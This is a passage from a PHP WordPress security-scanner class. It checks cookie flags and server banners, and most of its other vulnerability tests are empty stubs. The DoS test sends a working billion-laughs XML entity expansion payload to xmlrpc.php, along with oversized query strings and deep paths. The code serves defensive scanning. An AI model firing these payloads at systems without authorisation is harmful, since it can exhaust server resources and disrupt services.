        ];
      }

      // Check for missing HttpOnly flag
      if (!isset($attributes['httponly'])) {
        return [
          'affected_url' => $url,
          'description' => 'Cookie missing HttpOnly flag',
          'impact' => 'Cookies accessible via JavaScript, vulnerable to XSS attacks',
          'recommendation' => 'Add HttpOnly flag to prevent JavaScript access to cookies',
          'steps_to_reproduce' => '1. Check Set-Cookie headers\n2. Verify HttpOnly flag is present',
          'evidence_url' => $url,
          'screenshot_paths' => [$this->take_screenshot($url, 'cookie_httponly_' . time())]
        ];
      }

      // Check for missing SameSite attribute
      if (!isset($attributes['samesite'])) {
        return [
          'affected_url' => $url,
          'description' => 'Cookie missing SameSite attribute',
          'impact' => 'Vulnerable to CSRF attacks from cross-site requests',
          'recommendation' => 'Add SameSite attribute (Strict or Lax) to prevent CSRF',
          'steps_to_reproduce' => '1. Check Set-Cookie headers\n2. Verify SameSite attribute is present',
          'evidence_url' => $url,
          'screenshot_paths' => [$this->take_screenshot($url, 'cookie_samesite_' . time())]
        ];
      }
    }

    return null;
  }
  private function test_sensitive_data_in_url($url, $vuln)
  {
    return null;
  }
  private function test_sensitive_data_in_logs($url, $vuln)
  {
    return null;
  }
  private function test_data_encryption_at_rest($url, $vuln)
  {
    return null;
  }
  private function test_data_encryption_in_transit($url, $vuln)
  {
    return null;
  }
  private function test_weak_cryptographic_algorithms($url, $vuln)
  {
    return null;
  }
  private function test_insecure_random_number_generation($url, $vuln)
  {
    return null;
  }
  private function test_business_logic_vulnerabilities($url, $vuln)
  {
    return null;
  }
  private function test_race_conditions($url, $vuln)
  {
    return null;
  }
  private function test_api_rate_limiting($url, $vuln)
  {
    return null;
  }
  private function test_dos_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing DoS protection on: $url";

    // Test for potential DoS vectors
    $dos_tests = [
      // Large payload test
      [
        'type' => 'large_payload',
        'url' => $url . '/?' . str_repeat('param=large&', 1000),
        'description' => 'Large query string parameters'
      ],
      // Deep path traversal
      [
        'type' => 'deep_path',
        'url' => $url . '/' . str_repeat('deep/', 50) . 'test',
        'description' => 'Deep path traversal'
      ],
      // XML entity expansion (potential billion laughs)
      [
        'type' => 'xml_bomb',
        'url' => $url . '/xmlrpc.php',
        'method' => 'POST',
        'body' => '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        'description' => 'XML entity expansion attack'
      ],
    ];

    foreach ($dos_tests as $test) {
      $args = $this->http_args;

      if (isset($test['method']) && $test['method'] === 'POST') {
        $args['method'] = 'POST';
        $args['body'] = $test['body'];
        $args['headers']['Content-Type'] = 'text/xml';
      }

      $response = $this->cached_request($test['url'], $args);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        $headers = wp_remote_retrieve_headers($response);

        // Check response time (basic DoS detection)
        // Note: This is a simple check - real DoS testing would require timing analysis

        // Check for resource exhaustion indicators
        if ($code >= 500) {
          return [
            'affected_url' => $test['url'],
            'description' => 'Potential DoS vulnerability: ' . $test['description'],
            'impact' => 'Attackers can cause server resource exhaustion or crashes',
            'recommendation' => 'Implement rate limiting, input validation, and resource limits',
            'steps_to_reproduce' => '1. Send ' . $test['description'] . '\n2. Check for server errors or timeouts',
            'evidence_url' => $test['url'],
            'screenshot_paths' => [$this->take_screenshot($test['url'], 'dos_' . $test['type'] . '_' . time())]
          ];
        }

        // Check for XML parsing errors that might indicate successful attack
        $body = wp_remote_retrieve_body($response);
        if (stripos($body, 'entity') !== false && stripos($body, 'expansion') !== false) {
          return [
            'affected_url' => $test['url'],
            'description' => 'XML entity expansion vulnerability detected',
            'impact' => 'Attackers can cause DoS through XML parsing resource exhaustion',
            'recommendation' => 'Disable entity processing in XML parsers or limit entity expansion',
            'steps_to_reproduce' => '1. Send XML with entity expansion\n2. Check for parsing errors or resource exhaustion',
            'evidence_url' => $test['url'],
            'screenshot_paths' => [$this->take_screenshot($test['url'], 'xml_dos_' . time())]
          ];
        }
      }
    }

    return null;
  }
  private function test_waf_bypass($url, $vuln)
  {
    return null;
  }
  private function test_input_validation_bypass($url, $vuln)
  {
    return null;
  }
  private function test_authentication_bypass($url, $vuln)
  {
    return null;
  }
  private function test_admin_functionality_exposure($url, $vuln)
  {
    return null;
  }
  private function test_privilege_escalation($url, $vuln)
  {
    return null;
  }
  private function test_mass_assignment($url, $vuln)
  {
    return null;
  }
  private function test_idor_extended($url, $vuln)
  {
    return null;
  }
  private function test_file_path_traversal_extended($url, $vuln)
  {
    return null;
  }
  private function test_unrestricted_file_upload($url, $vuln)
  {
    return null;
  }
  private function test_server_side_validation_bypass($url, $vuln)
  {
    return null;
  }
  private function test_client_side_validation_only($url, $vuln)
  {
    return null;
  }
  private function test_insecure_third_party_integrations($url, $vuln)
  {
    return null;
  }
  private function test_exposed_adminer_phpmyadmin($url, $vuln)
  {
    return null;
  }
  private function test_wordpress_file_editor_access($url, $vuln)
  {
    return null;
  }
  private function test_plugin_theme_editor_vulnerability($url, $vuln)
  {
    return null;
  }
  private function test_wp_cron_security($url, $vuln)
  {
    return null;
  }
  private function test_user_registration_security($url, $vuln)
  {
    return null;
  }
  private function test_comment_security($url, $vuln)
  {
    return null;
  }
  private function test_search_functionality_security($url, $vuln)
  {
    return null;
  }
  private function test_contact_form_security($url, $vuln)
  {
    return null;
  }
  /**
   * RISK-097: Server Banner Grabbing
   */
  private function test_server_banner_grabbing($url, $vuln)
  {
    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);
    $server = isset($headers['server']) ? $headers['server'] : '';
    $x_powered_by = isset($headers['x-powered-by']) ? $headers['x-powered-by'] : '';

    $findings = [];
    if (!empty($server) && preg_match('/\d/', $server)) {
      $findings[] = "Server header exposes version: " . $server;
    }
    if (!empty($x_powered_by)) {
      $findings[] = "X-Powered-By header is present: " . $x_powered_by;
    }

    if (!empty($findings)) {
      return [
        'affected_url' => $url,
        'description' => "Server identity and version disclosure: " . implode(', ', $findings),
        'impact' => 'Attackers can identify specific server software versions and target known vulnerabilities.',
        'recommendation' => 'Configure your server to hide version information (e.g., ServerTokens Prod in Apache, server_tokens off in Nginx).',
        'steps_to_reproduce' => "Check HTTP response headers for 'Server' or 'X-Powered-By' tags.",
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'server_banner_' . time())]
      ];
    }

    return null;
  }
}
